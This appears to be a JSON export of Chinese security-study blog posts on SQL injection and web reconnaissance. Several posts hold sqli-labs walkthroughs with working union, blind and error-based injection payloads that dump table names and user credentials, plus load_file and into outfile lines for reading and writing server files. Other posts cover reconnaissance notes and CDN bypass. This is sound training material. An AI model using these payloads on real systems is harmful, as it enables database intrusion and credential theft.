1&#x3D;(user() regexp&#39;^ri&#39;); 通过 if 语句的条件判断，返回一些条件句，比如 if 等构造一个判断。根据返回结果是否等 于 0 或者 1 进行判断。 \n\nIII select * from users where id&#x3D;1 and 1&#x3D;(select 1 from information_schema.tables where table_schema&#x3D;&#39;security&#39; and table_name regexp &#39;^us[a-z]&#39; limit 0,1); 这里利用 select 构造了一个判断语句。我们只需要更换 regexp 表达式即可 &#39;^u[a-z]&#39; -&gt; &#39;^us[a-z]&#39; -&gt; &#39;^use[a-z]&#39; -&gt; &#39;^user[a-z]&#39; -&gt; FALSE\n\n正则注入介绍：http://www.cnblogs.com/lcamry/articles/5717442.html\n11、like匹配注入：和上述的正则类似，mysql 在匹配的时候我们可以用 ike 进行匹配。\n​        用法：select user() like ‘ro%’;结果正确返回1，错误返回0。\n\n12、floor()，其功能是“向下取整”，或者说“向下舍入”、“向零取舍”，即取不大于x的最大整数。其主要用于报错盲注中的函数。\n13、rand函数：可以产生一个0–1之间的随机数；配合floor()构造 payload。当rand()有了参数之后，他会对所查询的每条数据产生一个随机数，但是从时间角度看每次给的随机数值是一样的，所以这个随机数是可以预测的，也叫伪随机数。如图：\n\n\n*14、floor()配合rand()使用：floor(rand(1)2)；\nrand()返回的是0到1之间的随机数，乘2是为了让他返回0到2之间的随机数，组合floor()的取整，这里返回的值只能是0和1；\n\n15、groud by：对数据进行分组。配合rand()和floor()使用。\n\n16、updatexml() 函数：改变文档中符合条件的节点的值。        Updatexml(xml_documnet,XPath_string,new_value)；        第一个参数：XML_document是string格式，为XML文档对象的名称        第二个参数：XPath_string(Xpath格式的字符串)        第三个参数：new_value，string格式，替换查找到的符合条件的数据超过长度可以配合      substr()。\n17、extractvalue()函数：配合updatexml() 进行时间盲注。\nextractvalue (XML_document, XPath_string); \n第一个参数：XML_document是String格式，为XML文档对象的名称，第二个参数：XPath_string (Xpath格式的字符串).作用：从目标XML中返回包含所查询值的字符串\n\n##基于布尔SQL盲注—-构造逻辑判断\n布尔盲注主要基于返回的结果来来进行注入；\n通常利用left()，ascii()，ORD()，regexp，like等数据库关键字根据返回的逻辑值去判断数据库或者其他字段的名字。\n基于报错的SQL盲注—-构造payload 让信息通过错误提示回显出来通常利用concat()，floor()，rand()函数构造payload注入，爆出数据库名字或其他关键字段。\n基于时间的 SQL 盲注———-延时注入原理：某些查询不需要返回结果的，仅判断查询语句是否正确执行即可，可以使用sleep来进行时间盲注，取页面执行时间(结束时间-开始时间)来判断sleep函数是否正常执行，所以其是否正常执行可以看到一个布尔值，正常为True 报错False。本质是利用插入的sql语句执行造成时间延迟\n","slug":"SQL注入-盲注","date":"2022-02-02T07:08:10.000Z","categories_index":"SQL注入","tags_index":"SQL注入","author_index":"Aurora"},{"id":"9eb50f7de58edddafde74a5aa271206c","title":"SQL注入-文件读写操作","content":"[TOC]\nSQL注入文件读写及导出这里的load_file()和into outfile或into dumpfile函数都是Mysql数据库的内置函数。\n1、load_file():读取函数：\n以下代码实在数据库执行的源码进行文件读取：\nselect load_file(&#39;D:&#x2F;1.txt&#39;);这里的D可以用小写d\n\n这里的d:&#x2F;1.txt文件路径中的斜杠要用 &#x2F; ,由于在sql语句中 \\n是换行符，所以为了避免，这里的读取路径要使用 &#x2F; ；另一种可以通过\\进行转义出  \\ 。\n执行如下代码：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,load_file(&#39;D:&#x2F;1.txt&#39;),3 --+\n\n可以看到已读取出1.txt文件的内容。\n\n2、into outfile或into dumpfile:导出函数：\n源码执行语句：\nselect &#39;CTF1&#39; into outfile &#39;D:&#x2F;2.txt&#39;;\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,&#39;CTF1&#39;  into outfile &#39;D:&#x2F;2.txt&#39; --+\n\n这里的写入语句，要写入的东西和路径都需要加 ‘’ 。\n可以看到页面返回异常，但返回D盘查看文件，已将CTF1写入文件2.txt\n\n\nSQL注入任意文件读取，这样的漏洞一旦出发，可以读取数据库管理员的账号密码，也可以通过写入操作将后门植入，提高权限。\n文件读取操作必须要知道文件的具体路径。\n\n路径获取的常见方法报错显示：通过扫描工具或手工探测报错网页，会爆出该网站的真实路径；\n遗留文件：例如 phpinfo.php文件，可以找到网站路径\n漏洞报错：在搜索引擎根据网站使用的什么程序去搜索网站所在的爆路径的漏洞\n平台配置文件：配置文件里会有网站的路径信息。\n​                          敏感文件文章：https://blog.csdn.net/weixin_30292843/article/details/99381669\n爆破：很难找到路径信息，按照常规思路去爆破。这是由于搭建网站的时候会有常见的路径，\n​            例如：windows：                                              linux：\n​                                           d:&#x2F;www&#x2F;……                                     &#x2F;var&#x2F;www&#x2F;……\n\n魔术引号魔术引号开关：magic_quotes_gpc这个文件在php.ini目录下的文件\n魔术引号是为了防止任意文件读取的SQL注入。\n什么是魔术引号：当打开时，所有的 ‘（单引号），”（双引号），\\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。这和 addslashes() 作用完全相同。一个自动将进入 PHP 脚本的数据进行转义的过程。最好在编码时不要转义而在运行时根据需要而转义。\n魔术引号 【Warning：本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。】\n\n魔术引号的绕过：利用编码或宽字节绕过。\n\n防注入策略1.自带防御：魔术引导\n2.内置函数;int等\n3.自定义关键字：select，会对select,and,or等关键字进行过滤。（大小写混合可以尝试绕过过滤）\n4.WAF防护软件：安全狗，宝塔等\n","slug":"SQL注入-文件读写操作","date":"2022-02-01T04:55:10.000Z","categories_index":"SQL注入","tags_index":"SQL注入","author_index":"Aurora"},{"id":"13edec6f4d479c2c3e54757e7424c180","title":"SQL注入字符型和数字型判断","content":"[TOC]\n说明在SQL注入中如何判断字符型注入还是数字型注入很重要，这里自己记录一下。\n数字型判定1、and或者or\n假设数据库的执行语句是：select * from table where id&#x3D;$id\n这里我以自己本地的sql靶场为例。\n此时执行语句为：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;1\n\n返回正常页面\n\n若执行语句为：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;1 and 1&#x3D;2#\n\n页面异常\n\n这是因为这时数据库执行的语句为：\nselect * from table where id&#x3D;1 and 1&#x3D;2\n\n语句正确，逻辑错误。\n\n若执行语句为：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;1 or 1&#x3D;2#\n\n返回页面正常\n\n这时数据库执行的语句就是：\nselect * from table where id&#x3D;1 or 1&#x3D;2\n\n语句正确，逻辑正确，页面返回正常。\n因此，可以使用and或or来判断字段是否是数字型，但因为字段型的and和or返回的结果都为正常页面，我们就不好通过or来进行比较，一般习惯于用and 1&#x3D;2,如果是数字型，返回错误，但如果是字符型，返回正确，这样两者之间就有了不同，有了比较。\n2、单引号判断\n假如此时语句为：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;1&#39;\n\n这时数据库执行的语句就是：\nselect * from table where id&#x3D;1’\n\n单引号不匹配，语句正确，页面返回错误。\n\n字符型判定1、and或or\n假设数据库的执行语句是：\nselect * from table where id&#x3D;’$id’\n\n执行以下语句时：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1\n\n数据库执行的是：\nselect * from table where id&#x3D;‘1’\n\n页面返回正常\n\n若执行and语句时：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;2#\n\n这时数据库执行的语句就是：\nselect * from table where id&#x3D;‘1 and 1&#x3D;2’\n\n页面返回正常\n\n\n若执行or时：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;3 or 1&#x3D;2#\n\n这时数据库执行的语句就是：\nselect * from table where id&#x3D;‘3 or 1&#x3D;2’\n\n页面返回正常\n\n对于字符型注入，不管是and或者or，执行结果都是一样的，都会返回id&#x3D;1的页面，这是由于数据库中id的类型是数值型，比如int型，而MySQL数据库在执行语句时是会自动进行类型转换的，输入的字符3 or 1&#x3D;2会在执行时被自动转换成int型的3，所以最终的执行语句还是select * from table where id&#x3D;‘3’，这是数据库的特性问题，后面的字符可以是任意的，不会影响查询，我们在3后面加上任意字符，比如3ctf，最后都会被转换为3来进行语句执行。\n如图：\n此时的执行语句是：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;4ctf #\n\n可以看到此时返回页面的变化。\n如果id本身就是varchar类型的，那么数据库查询的时候就会进行精准的匹配，这样子’4ctf’等类似的数据由于数据库里没有匹配项,查询结果为空。\n所以，如果字段是字符型的，那么我们使用and或者or来测试时页面返回都是正常的\n2、单引号判断\n当执行一下语句时：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39;\n\nSQL语句就是：\nselect * from table where id&#x3D;‘1’’\n\n单引号不匹配，语句错误，页面错误\n\n注释多余的 ‘ 后：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; --+\n\n执行的SQL语句就是：\nselect * from table where id&#x3D;‘1’ --+’\n\n语句正确，页面正常\n\n这里与数字型判断不同的是，数字型判定尽管加上注释符，执行的SQL语句是select * from table where id&#x3D;1’ –+’ 因为单引号还是不匹配，语句还是错误的，页面还是返回错误。\n","slug":"SQL注入字符型和数字型判断","date":"2022-01-31T15:43:00.000Z","categories_index":"SQL注入","tags_index":"SQL注入","author_index":"Aurora"},{"id":"35084a956f4a822fbd12f304f8c336a2","title":"SQL注入-字符&数字型","content":"[TOC]\n###Less-1（字符型注入）\n0x00首先注入：\n?id&#x3D;1\n\n正常返回结果\n\n由于要判断注入点，如图：\n\n添加 ‘ 报错，证明有注入点，字符型，id&#x3D;1’报错是由于源码当中接收值的时候本身自己就是id&#x3D;’’的闭合形式，但由于我们自己强行在输入1的时候添加了1’，导致闭合之后形成了id&#x3D;’1’’，导致报错。\n0x01执行下列语句进行绕过：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; or 1&#x3D;1 --+\n\n此时正常回显\n\n0x02接下来判断字段数，此处可以利用 order by。Order by 对前面的数据进行排序，这里有三列数据，我们就只能用 order by 3,超过 3 就会报错。 ‘order by 4–+的结果显示结果超出。\n执行以下语句：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 3 --+\n\n\n\n0x03知道字段数之后，判断回显点，利用union联合注入：\n当 id 的数据在数据库中不存在时，（此时我们可以 id&#x3D;-1，两个 sql 语句进行联合操作时， 当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来）此处前台页面返 回了我们构造的 union 的数据。\n执行以下语句：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+\n\n\n此时执行语句应该为：\nselect ************ where id&#x3D;’-1’ union select 1,2,3–+’ LIMIT 0,1\n回显点为2和3\n0x04接下来爆当前所在数据库名，爆版本号：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,database(),version()--+\n\n\n0x05根据版本特性，爆数据库：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,schema_name,3  from information_schema.schemata  --+\n\n\n爆所有的数据库：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(schema_name),3  from information_schema.schemata  --+\n\n\n0x06由于爆出所在数据库名security，爆表名：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(table_name),3  from information_schema.tables  --+\n\n\n当前所在库的表：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(table_name),3  from information_schema.tables  where table_schema&#x3D;&#39;security&#39; --+\n\n\n0x07可以看到users这张表是存放用户名的表，接下来利用回显点3爆出列：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;) from information_schema.tables  where table_schema&#x3D;&#39;security&#39; --+\n\n\n爆表名语句：\nselect group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;\n\n爆列名语句：\nselect group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;\n\n\n\n0x08可以看到列的字段中出现了username和password两个字段，接下来爆用户名和密码：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(username),group_concat(password) from security.users--+\n\n\n爆用户名语句：\nselect group_concat(username) from security.users\n\n爆密码语句：\nselect group_concat(password) from security.users\n\n\nLees-2（数字型注入）##0x00\n先进行判断，执行下列语句：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;2\n\n页面正常\n\n0x01注入：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;2  and 1&#x3D;2 --+\n\n页面异常，可得知为数字型注入。\n\n0x02判断字段数：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;2  order by 4 --+\n\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;2  order by 3 --+\n\n页面正常。\n\n0x03后续操作和字符型注入一样。\n\nLees-30x00使用?id&#x3D;’进行尝试注入：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-3&#x2F;?id&#x3D;&#39;\n\n注入代码后，我们得到像这样的一个错误：\nMySQL server version for the right syntax to use near ””) LIMIT 0,1′\n\n这里它意味着，开发者使用的查询是：\nSelect login_name, select password from table where id&#x3D; (‘our input here’)\n\n而源码当中也是如下：\nSELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1\n\n\n0x01因此可以尝试这样注入：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-3&#x2F;?id&#x3D;1&#39;)--+\n\n页面返回正常\n\n0x02接下来可以判断字段数：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) order by 3 --+\n\n\n0x03判断回显点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,3 --+\n\n\n0x04其实除了?id&#x3D;1’)注入以外，根据源码可以判断出其他的注入语句：\n&#39;) or &#39;1&#39;&#x3D;(&#39;1&#39;\n) or 1&#x3D;1 --+\n\n第一句**’) or ‘1’&#x3D;(‘1’**只要使SQL语句的语法正确，即使括号配对即可成功注入；\n第二句) **or 1&#x3D;1 –+通过注释符把后面的‘)**注释掉即可。\n\n\n0x05其余的 payload 与 less1 中一致，只需要将 less-1 中的 ‘ 添加） 即’) \n\nLess-40x00使用以下代码进行注入：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-4&#x2F;?id&#x3D;1&quot;\n\n注入代码后，我们得到像这样的一个错误：\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQ L server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line\n\n这里它意味着，代码当中对 id 参数进行了 “” 和 () 的包装。\n查看源代码：\n$id &#x3D; &#39;&quot;&#39; . $id . &#39;&quot;&#39;;\n$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;\n\n第一行id进行了””包装，之后第二行进行了()包装\n\n0x01再用如下代码注入：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-4&#x2F;?id&#x3D;1&quot;) --+\n\n页面返回正常\n\n0x02判断字段数：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-4&#x2F;?id&#x3D;1&quot;)  order by 4--+\n\n\n0x03与Less-3一样，可成功注入的有：\n“) or ”1”&#x3D;(“1\n“) or 1&#x3D;1 --+\n\n\n\n0x04其余的 payload 与 less1 中一致，只需要将 less-1 中的 ‘ 更换为 “)。\n","slug":"Less1-Less4","date":"2022-01-30T15:59:34.000Z","categories_index":"SQL注入","tags_index":"SQL注入","author_index":"Aurora"},{"id":"7636cfd8370edb30f65feb72ed748040","title":"简要SQL注入","content":"[TOC]\n前言SQL 注入漏洞是重点部分，其中 SQL 注入 又非常复杂，区分各种数据库类型，提交方法，数据类型等注入等，此类漏洞是 WEB 安全中严重的安全漏洞，学习如何利用，挖掘，修复。\nSQL注入图解\n手工注入原理手工注入：构造不同的sql语句，用户输入的数据拼接到原本的语句之后带入数据库执行。\n数据库各种各样，但是：都用sql语句调用  （不同的数据库，同样的操作，语句会有些许些许不同）这些不同可以让我们判断目标网站是什么类型的数据库。\n一、判断注入点id&#x3D;1’在1后面加上单引号，页面出错\nid&#x3D;1 and 1&#x3D;1 正常 id&#x3D;1 and 1&#x3D;2 错误\n使用–注释时，需要使用空格，才能形成有效的sql语句，而#后面可以有空格，也可以没有，sql就是这么规定的，记住就行了。\n不加空格，–直接和系统自动生成的单引号连接在了一起，\n会被认为是一个关键词，无法注释掉系统自动生成的单引号。\n二、判断字段数order by：ORDER BY语句用于根据指定的列对结果集进行排序\n三、判断回显点union联合 合并：将多条查询语句的结果合并成一个结果\ngroup_concat()函数：查出库中所有的表\n四、查询相关内容猜询数据库版本and 1&#x3D;2 union select 1,version()\n猜询数据库\nand 1&#x3D;2 union select 1,schema_name from information_schema.tables limit 0，1（...）\n\nand 1&#x3D;2 union select 1,(select group_concat(schema_name) from           information_schema.tables)\n\nschema_name字段中存放着所有数据库名table_schema字段中存储着对应的数据库\nselect schema_name from information_schema.schemata\n\nselect database();查看当前所在的库\n猜询表名\nand 1&#x3D;2 union select 1,table_name  from  information_schema.tables where table_schema&#x3D;database() limit 1,1\n\nand 1&#x3D;2 union select 1,(select group_cancat(column_name) from information_schema.tables where table_schema&#x3D;database() and table_name&#x3D;&#39;admin&#39;)\n\n【table_name字段中存储着对应的表名】【column_name字段中存储着对应的值】\n查询字段内容\nand 1&#x3D;2 union select 1,cancat(username,&#39;,&#39;,password) from admin\n\n修改库名\nrename database 库名  to  新库名；\n\n修改列名\nalter table 库名 change column 旧列名 新列名 DATATIME（加类型）\n\n修改列的类型或约束\nalter table 库名 modify column 旧列名 TIMESTAMP；（修改类型）\n\n\n\n常用函数\nversion()——MySQL 版本 \nuser()——数据库用户名 \ndatabase()——数据库名 \n@@datadir——数据库路径 \n@@version_compile_os——操作系统版本\nconcat(str1,str2,…)——没有分隔符地连接字符串\nconcat_ws(separator,str1,str2,…)——含有分隔符地连接字符串\ngroup_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据\n\n一般注入的语句or 1&#x3D;1–+ \n‘or 1&#x3D;1–+ \n“or 1&#x3D;1–+ \n)or 1&#x3D;1–+ \n‘)or 1&#x3D;1–+ \n“) or 1&#x3D;1–+ \n“))or 1&#x3D;1–\n其源码一般为：\n$id&#x3D;$_GET[‘id’]; \n$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1”\n此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思 路，闭合后面的引号或者注释掉，注释掉采用–+ 或者 #（%23）\n逻辑运算的举例：\n①Select * from users where id&#x3D;1 and 1&#x3D;1; \n②Select * from users where id&#x3D;1 &amp;&amp; 1&#x3D;1; \n③Select * from users where id&#x3D;1 &amp; 1&#x3D;1; \n上述三者有什么区别？\n①和②是一样的，表达的意思是 id&#x3D;1 条件和 1&#x3D;1 条件进行与运算。③的意思是 id&#x3D;1 条件与 1 进行&amp;位操作，id&#x3D;1 被当作 true，与 1 进行 &amp; 运算 结果还是 1， 再进行&#x3D;操作，1&#x3D;1,还是 1（ps：&amp;的优先级大于&#x3D;）\n完整的注入流程：\n猜数据库 \nselect schema_name from information_schema.schemata \n\n猜某库的数据表 \nselect table_name from information_schema.tables where table_schema&#x3D;’xxxxx’ \n\n猜某表的所有列 \nSelect column_name from information_schema.columns where table_name&#x3D;’xxxxx’ \n","slug":"简要SQL注入","date":"2022-01-30T13:05:54.000Z","categories_index":"SQL注入","tags_index":"SQL注入","author_index":"Aurora"},{"id":"cadd35667758fe128c74aec131ce6e19","title":"WEB漏洞知识点","content":"[TOC]\n##前言\nWEB层面涉及的漏洞关系到渗透过程中的方方面面，漏洞的危害等级以及影响的范围等，要明白各个漏洞的形成原理，并且要明白如何去发现，如何去利用。\n\n常见漏洞原理\nSQL注入：简称注入攻击、SQL注入，被广泛用于非法获取网站控制权，是发生在应用程序的数据库层上的安全漏洞。在设计程序，忽略了对输入字符串中夹带的SQL指令的检查，被数据库误认为是正常的SQL指令而运行，从而使数据库受到攻击，可能导致数据被窃取、更改、删除，以及进一步导致网站被嵌入恶意代码、被植入后门程序等危害。通常情况下，SQL注入的位置包括：（1）表单提交，主要是POST请求，也包括GET请求；（2）URL参数提交，主要为GET请求参数；（3）Cookie参数提交；（4）HTTP请求头部的一些可修改的值，比如Referer、User_Agent等；（5）一些边缘的输入点，比如.mp3文件的一些文件信息等。\n\n文件上传：文件上传漏洞通常由于网页代码中的文件上传路径变量过滤不严造成的，如果文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，攻击者可通过 Web 访问的目录上传任意文件，包括网站后门文件（webshell），进而远程控制网站服务器。因此，在开发网站及应用程序过程中，需严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关目录的执行权限，防范webshell攻击。\n\nXSS跨站：跨站脚本攻击（Cross-site scripting，通常简称为XSS）发生在客户端，可被用于进行窃取隐私、钓鱼欺骗、窃取密码、传播恶意代码等攻击。XSS攻击使用到的技术主要为HTML和Javascript，也包括VBScript和ActionScript等。XSS攻击对WEB服务器虽无直接危害，但是它借助网站进行传播，使网站的使用用户受到攻击，导致网站用户帐号被窃取，从而对网站也产生了较严重的危害。XSS类型包括：（1）非持久型跨站：即反射型跨站脚本漏洞，是目前最普遍的跨站类型。跨站代码一般存在于链接中，请求这样的链接时，跨站代码经过服务端反射回来，这类跨站的代码不存储到服务端（比如数据库中）。上面章节所举的例子就是这类情况。（2）持久型跨站：这是危害最直接的跨站类型，跨站代码存储于服务端（比如数据库中）。常见情况是某用户在论坛发贴，如果论坛没有过滤用户输入的Javascript代码数据，就会导致其他浏览此贴的用户的浏览器会执行发贴人所嵌入的Javascript代码。（3）DOM跨站（DOM XSS）：是一种发生在客户端DOM（Document Object Model文档对象模型）中的跨站漏洞，很大原因是因为客户端脚本处理逻辑导致的安全问题。 \n\n文件包含：由攻击者向Web服务器发送请求时，在URL添加非法参数，Web服务器端程序变量过滤不严，把非法的文件名作为参数处理。这些非法的文件名可以是服务器本地的某个文件，也可以是远端的某个恶意文件。由于这种漏洞是由PHP变量过滤不严导致的，所以只有基于PHP开发的Web应用程序才有可能存在文件包含漏洞。\n\nCSRF：跨站请求伪造，它利用受害者尚未失效的身份认证信息（cookie，会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。\n\nSSRF：服务端请求伪造，由攻击者构造形成由服务端发起请求的一个安全漏洞。 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） SSRF漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。\n\n目录遍历： 目录遍历漏洞是攻击者向Web服务器发送请求，通过在URL中或在有特殊意义的目录中附加“..&#x2F;”、或者附加“..&#x2F;”的一些变形（如“..\\”或“..&#x2F;&#x2F;”甚至其编码），导致攻击者能够访问未授权的目录，以及在Web服务器的根目录以外执行命令。\n\n命令执行：命令执行漏洞是通过URL发起请求，在Web服务器端执行未授权的命令，获取系统信息，篡改系统配置，控制整个系统，使系统瘫痪等。\n命令执行漏洞主要有两种情况：\n   –通过目录遍历漏洞，访问系统文件夹，执行指定的系统命令；\n  –攻击者提交特殊的字符或者命令，Web程序没有进行检测或者绕过Web应用程序过滤，把用户提交的请求作为指令进行解析，导致执行任意命令。\n\n\n","slug":"WEB漏洞知识点","date":"2022-01-30T07:21:56.000Z","categories_index":"基础知识","tags_index":"基础知识","author_index":"Aurora"},{"id":"e1bdafc064990b71004087aa4da077ab","title":"架构，搭建，WAF等","content":"[TOC]\n前言在安全测试中，信息收集是非常重要的一个环节，此环节的信息将影响 到后续的成功几率，掌握信息的多少将决定发现漏洞机会大小，换言之决定着是否能完成目标的测试任务。渗透测试的思路 就是从信息收集这里开始。\n\n所谓信息搜集，其实就是为了扩大攻击面，信息搜集的越多，攻击的范围越大。\n站点搭建分析1.**搭建习惯-目录型站点 **：主站是一套程序，加一个目录打开后又是一套程序；两套程序会有两个漏洞形式（扫描目录或其他方法）；\n2.搭建习惯-端口类站点 ：网站管理员通过端口名使网站应用分开，例如：主站装在80端口，或其他端口配置其他服务，但是都在同一台服务器，若其中端口出现了问题，例如80端口出现漏洞，会影响其他端口（扫描端口或其他方法）；\n3.搭建习惯-子域名站点 ：子站和主站不在一台服务器上，如果在一个网段的话，会出现内网安全隐患；\n如果不同网段的话，搜集子站其他关于主站的信息再进行主站测试；\n4.搭建习惯-类似域名站点 ：域名的后缀不同或者域名的名字有所修改等，可以自己写个工具跑一下类似域名；可以在搜索引擎搜索 域名+php 或直接搜索域名找类似站点搜集更多信息。\n5.搭建习惯-旁注,C 段站点 ：\n旁注：同服务器，不同站点；例如：有 a站，b站等网站（多个站点服务器），我的目标的是b站，我通过查询又知道了有a站和其他站的存在，b站由于技术有限找不到漏洞；再找a站或其他站的权限问题再去获取到b站的权限；旁注查询：https://www.webscan.cc/\nC段：同网段，不同服务器，不同站点；例如：有a站，b站，c站和d站；目标是a站，查询网段信息，比如查询到了c站的网段，这个网段下有个多个网站，拿到其中一个站的权限，在通过提权获取到这个服务器的权限，由于目标主机处于同一内网下，再实施内网安全的测试方法获取到指定网站的服务器权限；\n6.搭建习惯-搭建软件特征站点 ：例如：phpstudy除新版本外采用root&#x2F;root作为数据库的默认密码；还有phpmyadmin文件夹，可以进入phpmyadmin文件夹使用默认数据库密码进入数据库\n##WAF 防护分析\n1.什么是WAF应用：\nWeb应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。\n2.如何快速识别WAF：wafw00f或者手工识别；部分网站数据包有此字段：X-Powered-By: WAF\n3.识别WAF对于安全测试的意义：了解是什么WAF，进行下一步。\nAPP及其他资产等在安全测试中，若 WEB 无法取得进展或无 WEB 的情况下，我们需要 借助 APP 或其他资产在进行信息收集，从而开展后续渗透。\nAPP 提取及抓包及后续配合APP如果涉及WEB，按照WEB思路继续渗透；\nAPP如果不涉及WEB：\n各种端口一顿乱扫-思路 \n各种接口一顿乱扫-思路 \n接口部分一顿测试-思路\n利用黑暗引擎搜索–乱扫：\nhttps://fofa.so/\nhttps://www.shodan.io/\nhttps://www.zoomeye.org/\n乱扫的目的是为了搜集更广泛的信息，扩大攻击面，为后续的渗透奠定坚实的基础。\n资产监控拓展域名搜集途径：\n\n##各种子域名查询\n1.DNS,备案,证书：利用站长工具进行搜集\n2.全球节点请求 cdn\n3.枚举爆破或解析子域名对应\n4.便于发现管理员相关的注册信息\n##Github 监控\n1.便于收集整理最新 exp 或 poc\n2.便于发现相关测试目标的资产\n（需要导入一个python脚本进行微信推送）\n涉及网站全球CDN服务查询：http://tools.ipip.net/cdn.php\n查询DNS解析记录：https://securitytrails.com/\n​                                   https://dnsdb.io/zh-cn/\n(更多查看思维导图)\n","slug":"架构，搭建，WAF等","date":"2022-01-28T11:21:46.000Z","categories_index":"信息搜集","tags_index":"信息搜集","author_index":"Aurora"},{"id":"83206ee7fe571f3999f994cc9873ecbb","title":"CDN绕过技术","content":"[TOC]\nCDN绕过CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。\n\n若对网站做安全测试的时候，对网站进行扫描的话，不能对CDN节点进行扫描；因为CDN节点主要目的为了用户提供访问速度，并且CDN节点只是一个缓存，缓存和真实的地方有很大区别，缓存具有时效性，不能与真实的网站最新内容相同步；所以对CDN进行网站扫描或漏洞利用或后门控制的话，只是一个虚拟的缓存网站，不是真实的网站；这就是为什么要进行CDN绕过。\n如何判断目标存在CDN服务利用多节点技术进行请求返回判断\n当去Ping优酷网站时可以看到，出现多个不同的IP地址，这表明存在CDN节点；若出现都是相同IP表明不存在CDN节点。\n\n\n常见的 CDN 绕过技术1.子域名查询 ：\nCDN不便宜，导致很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。\n2.邮件服务查询 